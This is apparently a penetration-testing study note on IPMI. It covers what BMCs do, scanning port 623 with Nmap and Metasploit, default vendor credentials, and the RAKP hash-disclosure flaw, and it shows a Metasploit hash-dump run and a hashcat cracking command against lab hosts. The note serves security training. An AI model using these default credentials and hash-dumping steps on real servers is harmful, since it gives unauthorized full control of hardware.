---
title: IPMI
description: ipmi
---

What is purpose of IPMI?

when would you use IPMI?

- IPMI (Intelligent Platform Management Interface) is a set of standardized specifications for remote management and monitoring of server hardware.
- It operates independently of the server's operating system.
- IPMI provides low-level access to the system hardware.
- It allows administrators to monitor the health of the system hardware (e.g., temperature, voltage, fan speeds, system logs).
- IPMI operates even when the server is powered off or the OS is unresponsive.
- It allows administrators to control server power remotely (on, off, or reset).
- IPMI captures hardware-related events in the System Event Log (SEL).
- It provides remote console access to interact with the BIOS or OS boot process.
- IPMI allows remote firmware updates for servers.

- does not require access to the operating system via a login shell

IPMI is typically used in three ways:

- *Before the OS has booted to modify BIOS settings*
- *When the host is fully powered down*
- *Access to a host after a system failure*

To function, IPMI requires the following components:

- Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
- Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
- Intelligent Platform Management Bus (IPMB) - extends the BMC
- IPMI Memory - stores things such as the system event log, repository store data, and more
- Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

# **Foot printing the Service**

1. **IPMI Protocol Basics:**
    - communicates over port 623 UDP
    - It is used by Baseboard Management Controllers (BMCs) to manage and monitor server hardware
2. **Baseboard Management Controllers (BMCs):**
    - Typically embedded ARM systems running Linux, connected directly to the motherboard
    - can be build into many motherboards or added via a PCI card
    - Common BMCs found in servers include HP iLO, Dell DRAC, and Supermicro IPMI
3. **BMC Access and Capabilities:**
    - Access to a BMC allows full control over the server hardware, similar to physical access
    - BMCs can be used to monitor, reboot, power off, or even reinstall the OS on the host
4. **BMC Interfaces:**
    - BMCs often provide a web-based management console and command-line access via Telnet or SSH
5. **Security Implications in Penetration Testing:**
    - During assessments, access to a BMC means gaining full control of the host system
    - Common BMCs in internal tests are HP iLO, Dell DRAC, and Supermicro IPMI

### **Nmap**

```python
[!bash!]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

- we can use alternative to nmap, that is metasploit

[IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

### **Metasploit Version Scan**

```python
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

| **Product** | **Username** | **Password** |
| --- | --- | --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | Randomized 8-character string (numbers & uppercase) |
| Supermicro IPMI | ADMIN | ADMIN |
- while dealing with BMCs these default password might give access
- it is important to know the default password for different services

# **Dangerous Settings**

- if default credentials fail, an alternative approach targets the RAKP (Remote Access Key Protocol) flaw in IPMI 2.0
- During IPMI authentication, the server sends a **salted SHA1 or MD5 hash** of the password **before** full authentication
- this flaw allows retrieval of password for ANY valid user account on the BMC
- hash can be cracked offline
- Use **Hashcat mode 7300** to crack IPMI password hashes
- Command to run the dictionary attack: hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
- it cannot be directly patched or fixed
- Apply network segmentation rules to restrict access to BMCs, limiting exposure to these vulnerabilities
- BMC web console access is a high-risk vulnerability, as it provides significant control over the host system

### **Metasploit Dumping Hashes**

```python
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- we found out the password hash and the password is ADMIN
- now we can attempt to login to BMC
- IPMI is widely used in the network environments to allow remote access for server management
- System administrators rely on IPMI for tasks that would typically require physical access to the server, especially during outages or for maintenance
- the convenience of IPMI comes with security risks, as password hash is exposed to anyone on the network
- while pen-testing checking on the IPMI should be the standard part as it is common in many environment
